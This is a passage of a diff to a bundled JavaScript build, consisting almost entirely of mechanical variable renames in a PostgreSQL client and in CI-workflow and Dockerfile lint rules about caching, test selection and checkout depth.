     relationships: snapshot.relationships
   });
 }
-var hash2, identity, inventoryPolicyDigest;
+var hash3, identity, inventoryPolicyDigest;
 var init_identity = __esm({
   "src/knowledge/identity.ts"() {
     "use strict";
-    hash2 = (value2) => createHash3("sha256").update(value2).digest("hex");
-    identity = (value2) => hash2(JSON.stringify(canonical(value2)));
+    hash3 = (value2) => createHash3("sha256").update(value2).digest("hex");
+    identity = (value2) => hash3(JSON.stringify(canonical(value2)));
     inventoryPolicyDigest = (config) => identity(["knowledge-inventory-v1", [...new Set(config.ignorePaths)].sort(), config.limits]);
   }
 });
@@ -7678,7 +7678,7 @@ var init_run_observation = __esm({
 
 // src/knowledge/mitigation.ts
 function definitionContent(definition) {
-  const { version, source, key: key2, revision, title, summary: summary3, instructions, risk, rules: rules9, files, technologies, contraindications, provenance } = definition;
+  const { version, source, key: key2, revision, title, summary: summary3, instructions, risk, rules: rules13, files, technologies, contraindications, provenance } = definition;
   return {
     version,
     source: version === 1 ? source : { host: source.host, repositoryId: source.repositoryId },
@@ -7688,7 +7688,7 @@ function definitionContent(definition) {
     summary: summary3,
     instructions,
     risk,
-    rules: rules9,
+    rules: rules13,
     files,
     technologies,
     contraindications,
@@ -7715,7 +7715,7 @@ function mitigationDefinitionFromRecipe(source, recipe) {
     files: [...recipe.files].sort(),
     technologies: [],
     contraindications: [],
-    patchDigest: hash2(recipe.patch ?? ""),
+    patchDigest: hash3(recipe.patch ?? ""),
     provenance: {
       experiment: recipe.source.experiment,
       arm: recipe.source.arm,
@@ -9580,8 +9580,8 @@ function wrap(socket, host) {
       error3 && !failure && (failure = error3);
       socket.destroy();
     },
-    keepAlive(seconds2) {
-      seconds2 && socket.setKeepAlive && socket.setKeepAlive(true, 1e3 * seconds2);
+    keepAlive(seconds3) {
+      seconds3 && socket.setKeepAlive && socket.setKeepAlive(true, 1e3 * seconds3);
     }
   };
   listen();
@@ -9829,13 +9829,13 @@ function Auth({ user, pass, binding: binding2 = "prefer", socket }) {
     return type === 0 ? ok() : type === 3 ? Password(await password2()) : type === 5 ? Password("md5" + md5(Buffer.concat([Buffer.from(md5(await password2() + user)), x.subarray(9, 13)]))) : type === 10 ? start2(x) : type === 11 ? proceed(x, await password2()) : type === 12 ? finish2(x) : unsupported(type);
   }
   function start2(x) {
-    const offered = x.toString("utf8", 9).split("\0"), certificate = binding2 !== "disable" && socket && socket.certificate && socket.certificate(), hash3 = certificate && endpoint(certificate), plus = !!hash3 && offered.includes("SCRAM-SHA-256-PLUS");
+    const offered = x.toString("utf8", 9).split("\0"), certificate = binding2 !== "disable" && socket && socket.certificate && socket.certificate(), hash4 = certificate && endpoint(certificate), plus = !!hash4 && offered.includes("SCRAM-SHA-256-PLUS");
     if (binding2 === "require" && !plus)
       throw unbound(offered.includes("SCRAM-SHA-256-PLUS") ? "the server certificate could not be hashed for it" : "the server did not offer it");
     if (!plus && !offered.includes("SCRAM-SHA-256"))
       throw Errors.generic("SASL_MECHANISM_NOT_SUPPORTED", "The server offered no supported SASL mechanism");
-    header = plus ? "p=tls-server-end-point,," : hash3 ? "y,," : "n,,";
-    bound = plus ? hash3 : false;
+    header = plus ? "p=tls-server-end-point,," : hash4 ? "y,," : "n,,";
+    bound = plus ? hash4 : false;
     nonce = crypto.randomBytes(18).toString("base64");
     verified = false;
     return SASL(plus ? "SCRAM-SHA-256-PLUS" : "SCRAM-SHA-256", header + "n=*,r=" + nonce);
@@ -9893,8 +9893,8 @@ function signature(x) {
   const params = der(x, oid.end), first = params.body < params.end && der(x, params.body);
   if (!first || x[first.start] !== 160)
     return "sha256";
-  const hash3 = der(x, der(x, first.body).body);
-  return digests[x.toString("hex", hash3.body, hash3.end)];
+  const hash4 = der(x, der(x, first.body).body);
+  return digests[x.toString("hex", hash4.body, hash4.end)];
 }
 function der(x, start2) {
   let length = x[start2 + 1], body = start2 + 2;
@@ -10147,12 +10147,12 @@ function Connection(ready, options, events) {
     refuse ? query(out, refused) : sync(out);
     schedule();
   }
-  function register(entry) {
-    const current = prepared.get(entry.name);
-    current && prepared.delete(entry.name);
-    prepared.set(entry.name, entry);
-    entry.owner.entry = entry;
-    entry.owner.fresh = null;
+  function register(entry2) {
+    const current = prepared.get(entry2.name);
+    current && prepared.delete(entry2.name);
+    prepared.set(entry2.name, entry2);
+    entry2.owner.entry = entry2;
+    entry2.owner.fresh = null;
     if (prepared.size <= limit)
       return;
     for (const [name, x] of prepared) {
@@ -10163,8 +10163,8 @@ function Connection(ready, options, events) {
       }
     }
   }
-  function drop(entry) {
-    prepared.get(entry.name) === entry && prepared.delete(entry.name);
+  function drop(entry2) {
+    prepared.get(entry2.name) === entry2 && prepared.delete(entry2.name);
   }
   function send(query2) {
     const { statement: statement2 } = query2.wire, x = Exchange("query", query2, connection2.lease, extended);
@@ -10267,16 +10267,16 @@ function Connection(ready, options, events) {
     x.flushing || (x.synced = true);
     debug(x.statement.text, x.values, x.entry ? x.entry.oids : x.params || x.query.wire.built.oids);
   }
-  function usable(entry, statement2) {
-    return entry.oids !== null && (entry.state === "parsing" || entry.state === "ready" && entry.version === statement2.version);
+  function usable(entry2, statement2) {
+    return entry2.oids !== null && (entry2.state === "parsing" || entry2.state === "ready" && entry2.version === statement2.version);
   }
-  function learned(entry, statement2) {
-    const shape = entry.oids.join() + ":" + entry.columns.map((x) => x.type).join();
+  function learned(entry2, statement2) {
+    const shape = entry2.oids.join() + ":" + entry2.columns.map((x) => x.type).join();
     if (statement2.shape !== shape) {
       statement2.shape === void 0 || statement2.version++;
       statement2.shape = shape;
     }
-    entry.version = statement2.version;
+    entry2.version = statement2.version;
   }
   function inferred(built) {
     for (let i = 0; i < built.oids.length; i++) {
@@ -10314,17 +10314,17 @@ function Connection(ready, options, events) {
         x.values = serialize(params, built, {});
         return run4(x, "");
       }
-      const entry = x.entry;
-      entry && (entry.oids = params, entry.columns = columns2, learned(entry, x.statement));
-      x.values = serialize(params, built, entry || {});
+      const entry2 = x.entry;
+      entry2 && (entry2.oids = params, entry2.columns = columns2, learned(entry2, x.statement));
+      x.values = serialize(params, built, entry2 || {});
       run4(x, name);
     } catch (error2) {
       x.own = error2;
       sync2(x, !!connection2.lease);
     }
   }
-  function same(entry, params, columns2) {
-    const a = entry.oids || [], b = entry.columns;
+  function same(entry2, params, columns2) {
+    const a = entry2.oids || [], b = entry2.columns;
     return !!b && a.length === params.length && params.every((x, i) => x === a[i]) && b.length === columns2.length && columns2.every((x, i) => x.type === b[i].type);
   }
   function describe3(statement2, oids) {
@@ -10634,30 +10634,30 @@ function Connection(ready, options, events) {
     release();
   }
   function failed(x) {
-    const entry = x.kind === "query" ? x.entry : null;
-    const parsing = x.fresh || entry && entry.owner === x && entry.state === "parsing";
+    const entry2 = x.kind === "query" ? x.entry : null;
+    const parsing = x.fresh || entry2 && entry2.owner === x && entry2.state === "parsing";
     if (x.error.code === "42P05" && x.kind === "query" && x.statement.name && parsing) {
-      entry && drop(entry);
+      entry2 && drop(entry2);
       x.statement.name += "_";
       return retryable(x) ? again(x, null) : settleError(x, x.error);
     }
-    if (!entry)
+    if (!entry2)
       return settleError(x, x.error);
-    if (entry.owner === x && entry.state === "parsing")
-      return drop(entry), settleError(x, x.error);
+    if (entry2.owner === x && entry2.state === "parsing")
+      return drop(entry2), settleError(x, x.error);
     if (x.error.code === "26000") {
-      drop(entry);
+      drop(entry2);
       return retryable(x) ? again(x, null) : settleError(x, x.error);
     }
     if (x.bound)
       return settleError(x, x.error);
     if (retryable(x))
       return again(x, x.error);
-    stale(entry);
+    stale(entry2);
     settleError(x, x.error);
   }
-  function stale(entry) {
-    prepared.get(entry.name) === entry && (entry.state = "stale");
+  function stale(entry2) {
+    prepared.get(entry2.name) === entry2 && (entry2.state = "stale");
   }
   function retryable(x) {
     return !x.retried && !x.cancel && !x.query.cancelled && !x.query.cursorFn && !x.streaming && x.lease === connection2.lease && status === "I" && !closing && (sent.length === 0 || !x.lease && options.max !== 1);
@@ -12585,8 +12585,8 @@ function executionProjectPath(value2) {
 }
 function executionTools(value2) {
   if (!Array.isArray(value2) || value2.length > 32) throw new Error("Execution tools must be a bounded list");
-  const result = value2.map((entry) => {
-    const item = object(entry);
+  const result = value2.map((entry2) => {
+    const item = object(entry2);
     return {
       name: enumeration(item.name, tools, "tool"),
       version: string2(item.version, /^v?\d+(?:\.\d+){1,3}(?:[-+][A-Za-z0-9.-]{1,60})?$/, "installed tool version"),
@@ -12599,8 +12599,8 @@ function executionTools(value2) {
 }
 function executionCaches(value2) {
   if (!Array.isArray(value2) || value2.length > 16) throw new Error("Execution caches must be a bounded list");
-  const result = value2.map((entry) => {
-    const item = object(entry);
+  const result = value2.map((entry2) => {
+    const item = object(entry2);
     return { tool: enumeration(item.tool, caches, "cache tool"), result: enumeration(item.result, states2, "cache result"), basis: "workflow-report" };
   });
   if (new Set(result.map(({ tool: tool2 }) => tool2)).size !== result.length) throw new Error("Execution cache tools must be unique");
@@ -13785,7 +13785,7 @@ function entries(source, node) {
   return direct2;
 }
 function field(source, node, key2) {
-  return entries(source, node).find((entry) => entry.key === key2);
+  return entries(source, node).find((entry2) => entry2.key === key2);
 }
 function items(source, node) {
   const { node: seqNode } = resolveNode(source, node);
@@ -13848,13 +13848,13 @@ function parseActionRef(raw) {
     shaPinned: ref !== void 0 && SHA_PATTERN.test(ref)
   };
 }
-function sourced(source, entry) {
-  if (!entry) return void 0;
-  const value2 = toJS(source, entry.value);
-  return { value: value2, kind: classify(value2), line: entry.line, origin: entry.origin };
+function sourced(source, entry2) {
+  if (!entry2) return void 0;
+  const value2 = toJS(source, entry2.value);
+  return { value: value2, kind: classify(value2), line: entry2.line, origin: entry2.origin };
 }
-function sourcedString(source, entry) {
-  const result = sourced(source, entry);
+function sourcedString(source, entry2) {
+  const result = sourced(source, entry2);
   if (!result || result.value === void 0 || result.value === null) return void 0;
   return { ...result, value: String(result.value) };
 }
@@ -13870,36 +13870,36 @@ function record(source, node) {
   return value2 && typeof value2 === "object" && !Array.isArray(value2) ? value2 : {};
 }
 function parseSteps(source, stepsNode, keyPrefix) {
-  return items(source, stepsNode).map((stepNode, index) => {
-    const usesField = field(source, stepNode, "uses");
-    const runField = field(source, stepNode, "run");
-    const withField = field(source, stepNode, "with");
+  return items(source, stepsNode).map((stepNode3, index) => {
+    const usesField = field(source, stepNode3, "uses");
+    const runField = field(source, stepNode3, "run");
+    const withField = field(source, stepNode3, "with");
     const withMap = /* @__PURE__ */ new Map();
-    for (const entry of entries(source, withField?.value)) {
-      const value2 = sourced(source, entry);
-      if (value2) withMap.set(entry.key, value2);
+    for (const entry2 of entries(source, withField?.value)) {
+      const value2 = sourced(source, entry2);
+      if (value2) withMap.set(entry2.key, value2);
     }
     const uses = sourcedString(source, usesField);
     const run4 = sourcedString(source, runField);
     const runNode = runField?.value;
     const isBlock = (0, import_yaml2.isScalar)(runNode) && (runNode.type === import_yaml2.Scalar.BLOCK_LITERAL || runNode.type === import_yaml2.Scalar.BLOCK_FOLDED);
     const contentLine = runNode ? lineOfNode(source, runNode) + (isBlock ? 1 : 0) : 0;
-    const id = stringValue(field(source, stepNode, "id")?.value);
-    const name = stringValue(field(source, stepNode, "name")?.value);
-    const workingDirectory = stringValue(field(source, stepNode, "working-directory")?.value);
-    const condition = stringValue(field(source, stepNode, "if")?.value);
+    const id = stringValue(field(source, stepNode3, "id")?.value);
+    const name = stringValue(field(source, stepNode3, "name")?.value);
+    const workingDirectory3 = stringValue(field(source, stepNode3, "working-directory")?.value);
+    const condition = stringValue(field(source, stepNode3, "if")?.value);
     return {
       index,
-      line: lineOfNode(source, stepNode),
+      line: lineOfNode(source, stepNode3),
       key: `${keyPrefix}.steps[${index}]`,
       ...id !== void 0 ? { id } : {},
       ...name !== void 0 ? { name } : {},
       ...uses ? { uses: { ...uses, action: parseActionRef(uses.value) } } : {},
       with: withMap,
       ...run4 ? { run: { ...run4, contentLine } } : {},
-      ...workingDirectory !== void 0 ? { workingDirectory } : {},
+      ...workingDirectory3 !== void 0 ? { workingDirectory: workingDirectory3 } : {},
       ...condition !== void 0 ? { if: condition } : {},
-      env: record(source, field(source, stepNode, "env")?.value)
+      env: record(source, field(source, stepNode3, "env")?.value)
     };
   });
 }
@@ -13912,14 +13912,14 @@ function parseTriggers(source, onField) {
   const value2 = toJS(source, onField.value);
   if (typeof value2 === "string") return [{ event: value2, line: onField.line }];
   if (Array.isArray(value2)) return value2.map((event) => ({ event: String(event), line: onField.line }));
-  return entries(source, onField.value).map((entry) => {
-    const paths = stringList(source, field(source, entry.value, "paths")?.value);
-    const pathsIgnore = stringList(source, field(source, entry.value, "paths-ignore")?.value);
-    const branches = stringList(source, field(source, entry.value, "branches")?.value);
-    const types2 = stringList(source, field(source, entry.value, "types")?.value);
+  return entries(source, onField.value).map((entry2) => {
+    const paths = stringList(source, field(source, entry2.value, "paths")?.value);
+    const pathsIgnore = stringList(source, field(source, entry2.value, "paths-ignore")?.value);
+    const branches = stringList(source, field(source, entry2.value, "branches")?.value);
+    const types2 = stringList(source, field(source, entry2.value, "types")?.value);
     return {
-      event: entry.key,
-      line: entry.line,
+      event: entry2.key,
+      line: entry2.line,
       ...paths ? { paths } : {},
       ...pathsIgnore ? { pathsIgnore } : {},
       ...branches ? { branches } : {},
@@ -13927,9 +13927,9 @@ function parseTriggers(source, onField) {
     };
   });
 }
-function parseJob(source, entry) {
-  const node = entry.value;
-  const key2 = `jobs.${entry.key}`;
+function parseJob(source, entry2) {
+  const node = entry2.value;
+  const key2 = `jobs.${entry2.key}`;
   const needsValue = toJS(source, field(source, node, "needs")?.value);
   const needs = typeof needsValue === "string" ? [needsValue] : Array.isArray(needsValue) ? needsValue.map(String) : [];
   const containerField = field(source, node, "container");
@@ -13942,15 +13942,15 @@ function parseJob(source, entry) {
   const matrix = toJS(source, field(source, strategy?.value, "matrix")?.value);
   const name = stringValue(field(source, node, "name")?.value);
   const condition = stringValue(field(source, node, "if")?.value);
-  const workingDirectory = defaultsWorkingDirectory(source, node);
+  const workingDirectory3 = defaultsWorkingDirectory(source, node);
   const runsOn = sourced(source, field(source, node, "runs-on"));
   const timeoutMinutes = sourced(source, field(source, node, "timeout-minutes"));
   const uses = sourcedString(source, field(source, node, "uses"));
   const concurrency = sourced(source, field(source, node, "concurrency"));
-  const environment = sourced(source, field(source, node, "environment"));
+  const environment2 = sourced(source, field(source, node, "environment"));
   return {
-    id: entry.key,
-    line: entry.line,
+    id: entry2.key,
+    line: entry2.line,
     key: key2,
     ...name !== void 0 ? { name } : {},
     ...runsOn ? { runsOn } : {},
@@ -13960,11 +13960,11 @@ function parseJob(source, entry) {
     ...containerImage ? { containerImage } : {},
     services,
     ...concurrency ? { concurrency } : {},
-    ...environment ? { environment } : {},
+    ...environment2 ? { environment: environment2 } : {},
     ...condition !== void 0 ? { if: condition } : {},
     ...matrix && typeof matrix === "object" && !Array.isArray(matrix) ? { matrix } : typeof matrix === "string" ? { matrix: { __expression: matrix } } : {},
     steps: parseSteps(source, field(source, node, "steps")?.value, key2),
-    ...workingDirectory !== void 0 ? { workingDirectory } : {},
+    ...workingDirectory3 !== void 0 ? { workingDirectory: workingDirectory3 } : {},
     env: record(source, field(source, node, "env")?.value)
   };
 }
@@ -14006,7 +14006,7 @@ function parseWorkflow(path, content) {
   }
   const onField = field(source, root, "on");
   const concurrency = sourced(source, field(source, root, "concurrency"));
-  const workingDirectory = defaultsWorkingDirectory(source, root);
+  const workingDirectory3 = defaultsWorkingDirectory(source, root);
   return {
     kind: "workflow",
     path,
@@ -14015,9 +14015,9 @@ function parseWorkflow(path, content) {
     triggers: parseTriggers(source, onField),
     triggersLine: onField?.line ?? 1,
     ...concurrency ? { concurrency } : {},
-    ...workingDirectory !== void 0 ? { workingDirectory } : {},
+    ...workingDirectory3 !== void 0 ? { workingDirectory: workingDirectory3 } : {},
     env: record(source, field(source, root, "env")?.value),
-    jobs: entries(source, field(source, root, "jobs")?.value).map((entry) => parseJob(source, entry))
+    jobs: entries(source, field(source, root, "jobs")?.value).map((entry2) => parseJob(source, entry2))
   };
 }
 function runLine(step, offset) {
@@ -14069,10 +14069,10 @@ function replaceOnLine(file, line, search, replacement) {
 }
 function insertLinesAfter(file, line, lines) {
   const eol = newline(file.content);
-  if (line <= 0) return { path: file.path, start: 0, end: 0, text: lines.map((entry) => entry + eol).join("") };
+  if (line <= 0) return { path: file.path, start: 0, end: 0, text: lines.map((entry2) => entry2 + eol).join("") };
   const start2 = lineStart(file.content, line + 1);
   const atEnd = start2 >= file.content.length && !file.content.endsWith("\n");
-  const text4 = (atEnd ? eol : "") + lines.map((entry) => entry + eol).join("");
+  const text4 = (atEnd ? eol : "") + lines.map((entry2) => entry2 + eol).join("");
   return { path: file.path, start: start2, end: start2, text: text4 };
 }
 function fix(description, ...edits) {
@@ -14147,9 +14147,9 @@ function* steps(workflows) {
 }
 function* stepsUsing(workflows, ...names) {
   const wanted = names.map((name) => name.toLowerCase());
-  for (const entry of steps(workflows)) {
-    const action = entry.step.uses?.action;
-    if (action?.kind === "remote" && action.name !== void 0 && wanted.includes(action.name)) yield entry;
+  for (const entry2 of steps(workflows)) {
+    const action = entry2.step.uses?.action;
+    if (action?.kind === "remote" && action.name !== void 0 && wanted.includes(action.name)) yield entry2;
   }
 }
 function isPullRequestWorkflow(workflow) {
@@ -14175,9 +14175,9 @@ function directWith(workflow, step) {
   const parent = match2[1] !== void 0 ? directChild(directChild(root, "jobs"), match2[1]) : directChild(root, "runs");
   const stepsNode = directChild(parent, "steps");
   if (!(0, import_yaml4.isSeq)(stepsNode)) return void 0;
-  const stepNode = stepsNode.items[Number(match2[2])];
-  if (!(0, import_yaml4.isMap)(stepNode) || stepNode.flow || lineOfNode(workflow.source, stepNode) !== step.line) return void 0;
-  const withNode = directChild(stepNode, "with");
+  const stepNode3 = stepsNode.items[Number(match2[2])];
+  if (!(0, import_yaml4.isMap)(stepNode3) || stepNode3.flow || lineOfNode(workflow.source, stepNode3) !== step.line) return void 0;
+  const withNode = directChild(stepNode3, "with");
   return (0, import_yaml4.isMap)(withNode) && !withNode.flow ? withNode : void 0;
 }
 function expandedJobSteps(project, workflow, job) {
@@ -14191,7 +14191,7 @@ function expandedJobSteps(project, workflow, job) {
 }
 function jobCommands(project, workflow, job) {
   return expandedJobSteps(project, workflow, job).flatMap(
-    (entry) => commandsOf(entry.step).map(({ command, line }) => ({ ...entry, command, line }))
+    (entry2) => commandsOf(entry2.step).map(({ command, line }) => ({ ...entry2, command, line }))
   );
 }
 function isKnownMonorepo(project) {
@@ -14324,7 +14324,7 @@ var change_detection_default = defineRule({
       );
       if (pathFiltered) continue;
       const jobs = collectJobs(project, workflow, /* @__PURE__ */ new Set());
-      if (!jobs || jobs.some((entry) => detectsChanges(project, entry))) continue;
+      if (!jobs || jobs.some((entry2) => detectsChanges(project, entry2))) continue;
       report({
         path: workflow.path,
         line: workflow.triggersLine,
@@ -14521,16 +14521,16 @@ var test_selection_default = defineRule({
       if (workflow.kind !== "workflow" || !hasTrigger(workflow, "pull_request", "pull_request_target")) continue;
       for (const job of workflow.jobs) {
         if (skipsPullRequests(job)) continue;
-        for (const entry of jobCommands(project, workflow, job)) {
-          if (skipsPullRequests(entry.owner) || skipsPullRequests(entry.step)) continue;
-          const finding2 = detect(project, entry.command);
-          if (!finding2) continue;
+        for (const entry2 of jobCommands(project, workflow, job)) {
+          if (skipsPullRequests(entry2.owner) || skipsPullRequests(entry2.step)) continue;
+          const finding3 = detect(project, entry2.command);
+          if (!finding3) continue;
           report({
-            path: entry.path,
-            line: entry.line,
-            key: `${entry.owner.key}:${finding2.tool}`,
-            message: `\`${finding2.tool}\` runs ${finding2.what} on every pull request instead of only what the change affects.`,
-            suggestion: finding2.suggestion
+            path: entry2.path,
+            line: entry2.line,
+            key: `${entry2.owner.key}:${finding3.tool}`,
+            message: `\`${finding3.tool}\` runs ${finding3.what} on every pull request instead of only what the change affects.`,
+            suggestion: finding3.suggestion
           });
         }
       }
@@ -14615,7 +14615,7 @@ function anyUses(steps2, ...names) {
   return steps2.some((step) => usesAction(step, ...names));
 }
 function listOf(value2) {
-  return value2.split(/\r?\n/).map((entry) => entry.trim()).filter((entry) => entry !== "" && !entry.startsWith("#"));
+  return value2.split(/\r?\n/).map((entry2) => entry2.trim()).filter((entry2) => entry2 !== "" && !entry2.startsWith("#"));
 }
 function isFalse(value2) {
   return value2 === false || typeof value2 === "string" && value2.trim().toLowerCase() === "false";
@@ -14629,7 +14629,7 @@ function cacheCovers(steps2, path, key2) {
     const pathEntry = step.with.get("path");
     if (pathEntry && pathEntry.kind !== "literal") return true;
     const paths = pathEntry && typeof pathEntry.value === "string" ? listOf(pathEntry.value) : [];
-    if (paths.some((entry) => !entry.startsWith("!") && path.test(entry))) return true;
+    if (paths.some((entry2) => !entry2.startsWith("!") && path.test(entry2))) return true;
     const keyValue = step.with.get("key")?.value;
     return key2 !== void 0 && typeof keyValue === "string" && key2.test(keyValue);
   });
@@ -14888,7 +14888,7 @@ var cache_key_default = defineRule({
           if (save) continue;
           const path = step.with.get("path");
           if (!path || path.kind !== "literal" || typeof path.value !== "string") continue;
-          const cachesNodeModules = listOf(path.value).some((entry) => !entry.startsWith("!") && /(^|\/)node_modules\/?$/.test(entry));
+          const cachesNodeModules = listOf(path.value).some((entry2) => !entry2.startsWith("!") && /(^|\/)node_modules\/?$/.test(entry2));
           if (!cachesNodeModules) continue;
           const later = all.slice(all.indexOf(step) + 1);
           if (!later.some(runsNpmCi)) continue;
@@ -14906,16 +14906,16 @@ var cache_key_default = defineRule({
 });
 
 // src/lint/rules/caching/docker-layer-cache.ts
-function cacheEntries(entry) {
-  if (!entry || entry.kind === "expression" || typeof entry.value !== "string") return [];
-  return listOf(entry.value).map((text4) => {
+function cacheEntries(entry2) {
+  if (!entry2 || entry2.kind === "expression" || typeof entry2.value !== "string") return [];
+  return listOf(entry2.value).map((text4) => {
     const attributes = /* @__PURE__ */ new Map();
     for (const part2 of text4.split(",")) {
       const eq = part2.indexOf("=");
       if (eq > 0) attributes.set(part2.slice(0, eq).trim().toLowerCase(), part2.slice(eq + 1).trim());
     }
     const type = attributes.get("type") ?? (text4.includes("=") ? "" : "registry");
-    return { type: type.toLowerCase(), attributes, line: entry.line };
+    return { type: type.toLowerCase(), attributes, line: entry2.line };
   });
 }
 function dockerBuildIndex(words2) {
@@ -14968,7 +14968,7 @@ var docker_layer_cache_default = defineRule({
           continue;
         }
         const entries2 = [...cacheEntries(cacheTo), ...cacheEntries(cacheFrom)];
-        const unscoped = entries2.find((entry) => entry.type === "gha" && !entry.attributes.has("scope"));
+        const unscoped = entries2.find((entry2) => entry2.type === "gha" && !entry2.attributes.has("scope"));
         if (unscoped && buildPushCount >= 2) {
           report({
             path: workflow.path,
@@ -14978,7 +14978,7 @@ var docker_layer_cache_default = defineRule({
             suggestion: "Give each image a unique scope, e.g. `cache-from: type=gha,scope=<image>` and `cache-to: type=gha,mode=max,scope=<image>`."
           });
         }
-        const inline = entries2.find((entry) => entry.type === "inline");
+        const inline = entries2.find((entry2) => entry2.type === "inline");
         if (inline) {
           report({
             path: workflow.path,
@@ -15073,15 +15073,15 @@ function declaredNodeManager(project) {
 }
 var MAY_INSTALL = /(^|[\s;&|(`])(npm|pnpm|yarn|npx|bun|bunx|corepack|make|just|task|turbo|nx|lerna|rush)(\s|$)|(^|\s)(\.{1,2}\/|bash\s|sh\s|source\s)|\.(sh|bash)\b/;
 function mayInstallNodePackages(after2) {
-  const commands = after2.flatMap((step) => commandsOf(step).map((entry) => entry.command));
+  const commands = after2.flatMap((step) => commandsOf(step).map((entry2) => entry2.command));
   return commands.length === 0 || commands.some((command) => MAY_INSTALL.test(command));
 }
 function earlierCommands(before) {
-  return before.flatMap((step) => commandsOf(step).map((entry) => entry.command));
+  return before.flatMap((step) => commandsOf(step).map((entry2) => entry2.command));
 }
 function literalWith(step, key2) {
-  const entry = step.with.get(key2);
-  return entry && entry.kind === "literal" && entry.value !== null && entry.value !== void 0 ? String(entry.value) : void 0;
+  const entry2 = step.with.get(key2);
+  return entry2 && entry2.kind === "literal" && entry2.value !== null && entry2.value !== void 0 ? String(entry2.value) : void 0;
 }
 function checkNode(project, step, before, all, file) {
   if (step.with.has("cache")) return void 0;
@@ -15202,9 +15202,9 @@ function checkDotnet(project, step, all) {
 }
 function cacheFix(file, step, value2) {
   if (!file) return void 0;
-  const direct2 = [...step.with.values()].filter((entry) => entry.origin === "direct" && entry.line > step.line);
+  const direct2 = [...step.with.values()].filter((entry2) => entry2.origin === "direct" && entry2.line > step.line);
   if (direct2.length === 0 || direct2.length !== step.with.size) return void 0;
-  const first = Math.min(...direct2.map((entry) => entry.line));
+  const first = Math.min(...direct2.map((entry2) => entry2.line));
   const text4 = lineText(file.content, first);
   if (!/^\s*[A-Za-z0-9_-]+\s*:/.test(text4) || /[{}]/.test(text4)) return void 0;
   let withLine;
@@ -15251,21 +15251,21 @@ var setup_cache_default = defineRule({
         const all = project.expandedSteps(job);
         for (const step of job.steps) {
           const before = all.slice(0, Math.max(0, all.indexOf(step)));
-          let finding2;
-          if (usesAction(step, "actions/setup-node")) finding2 = checkNode(project, step, before, all, file);
-          else if (usesAction(step, "actions/setup-python")) finding2 = checkPython(project, step, before, all);
-          else if (usesAction(step, "actions/setup-java")) finding2 = checkJava(project, step, all);
-          else if (usesAction(step, "actions/setup-go")) finding2 = checkGo(step, all);
-          else if (usesAction(step, "actions/setup-dotnet")) finding2 = checkDotnet(project, step, all);
-          if (!finding2) continue;
-          const autofix = finding2.fixValue ? cacheFix(file, step, finding2.fixValue) : void 0;
+          let finding3;
+          if (usesAction(step, "actions/setup-node")) finding3 = checkNode(project, step, before, all, file);
+          else if (usesAction(step, "actions/setup-python")) finding3 = checkPython(project, step, before, all);
+          else if (usesAction(step, "actions/setup-java")) finding3 = checkJava(project, step, all);
+          else if (usesAction(step, "actions/setup-go")) finding3 = checkGo(step, all);
+          else if (usesAction(step, "actions/setup-dotnet")) finding3 = checkDotnet(project, step, all);
+          if (!finding3) continue;
+          const autofix = finding3.fixValue ? cacheFix(file, step, finding3.fixValue) : void 0;
           report({
             path: workflow.path,
-            line: finding2.line ?? step.uses?.line ?? step.line,
+            line: finding3.line ?? step.uses?.line ?? step.line,
             key: `${step.key}:no-cache`,
-            message: finding2.message,
-            suggestion: finding2.suggestion,
-            ...finding2.impact ? { impact: finding2.impact } : {},
+            message: finding3.message,
+            suggestion: finding3.suggestion,
+            ...finding3.impact ? { impact: finding3.impact } : {},
             ...autofix ? { fix: autofix } : {}
           });
         }
@@ -15327,21 +15327,21 @@ var affected_base_ref_default = defineRule({
         if (expanded.some(({ step }) => step.uses?.action.name === "nrwl/nx-set-shas")) continue;
         let checkout;
         let fetched = false;
-        for (const entry of expanded) {
-          if (isSelfCheckout(entry.step)) {
-            checkout = entry;
+        for (const entry2 of expanded) {
+          if (isSelfCheckout(entry2.step)) {
+            checkout = entry2;
             fetched = false;
           }
-          for (const { command, line } of commandsOf(entry.step)) {
+          for (const { command, line } of commandsOf(entry2.step)) {
             if (GIT_FETCH.test(command)) fetched = true;
             const tool2 = affectedTooling(command);
             if (!tool2 || !checkout || fetched || !isShallow(checkout.step)) continue;
             const noBase = hasNoBase(command, tool2);
             const nxHint = tool2 === "nx affected" ? " For Nx, also add `nrwl/nx-set-shas@v5` after checkout so NX_BASE is the last successful default-branch commit." : "";
             report({
-              path: entry.path,
+              path: entry2.path,
               line,
-              key: `${entry.owner.key}:${tool2}`,
+              key: `${entry2.owner.key}:${tool2}`,
               message: noBase ? `\`${tool2}\` without a base ref compares against uncommitted changes, so in a shallow CI checkout it selects nothing.` : `\`${tool2}\` needs the base commit, but actions/checkout only fetched one commit (default fetch-depth: 1), so it fails or treats everything as changed.`,
               suggestion: noBase ? "Pass an explicit base (for example `--changedSince=origin/${{ github.base_ref }}` or `--changed origin/${{ github.base_ref }}`) and fetch it first with `git fetch --no-tags --depth=<n> origin ${{ github.base_ref }}`, or set `fetch-depth: 0` with `filter: blob:none` on checkout." : `Fetch the base before this command: set \`fetch-depth: 0\` and \`filter: blob:none\` on actions/checkout (full history, file contents on demand), or run \`git fetch --no-tags --depth=<n> origin \${{ github.base_ref }}\` first.${nxHint}`,
               related: [{ path: checkout.path, line: checkout.step.uses?.line ?? checkout.step.line }],
@@ -16510,7 +16510,7 @@ var dockerignore_default = defineRule({
           line: 1,
           key: "incomplete",
           impact: "low",
-          message: `${ignorePath} does not exclude ${missing.map((entry) => `\`${entry}\``).join(", ")}, which \`${broad.keyword} ${broad.args.replace(/\s+/g, " ").trim()}\` in ${model.path} (line ${broad.line}) copies into the image and hashes on every build.`,
+          message: `${ignorePath} does not exclude ${missing.map((entry2) => `\`${entry2}\``).join(", ")}, which \`${broad.keyword} ${broad.args.replace(/\s+/g, " ").trim()}\` in ${model.path} (line ${broad.line}) copies into the image and hashes on every build.`,
           suggestion: `Add ${missing.includes(".git") ? "`.git` and " : ""}\`**/node_modules\` (patterns are anchored at the context root, so plain \`node_modules\` only matches the top level).`,
           related: [{ path: model.path, line: broad.line }]
         });
@@ -16611,12 +16611,12 @@ var multi_stage_default = defineRule({
         }
       }
       if (evidence2.length === 0) continue;
-      const runtime = RUNTIME_HINTS.find((hint) => evidence2.some((entry) => hint.pattern.test(entry.label.replace(/^`/, ""))))?.runtime ?? "a `-slim` or distroless image";
+      const runtime = RUNTIME_HINTS.find((hint) => evidence2.some((entry2) => hint.pattern.test(entry2.label.replace(/^`/, ""))))?.runtime ?? "a `-slim` or distroless image";
       const related = [];
-      for (const entry of evidence2) {
-        if (!related.some((location) => location.line === entry.line)) related.push({ path: model.path, line: entry.line });
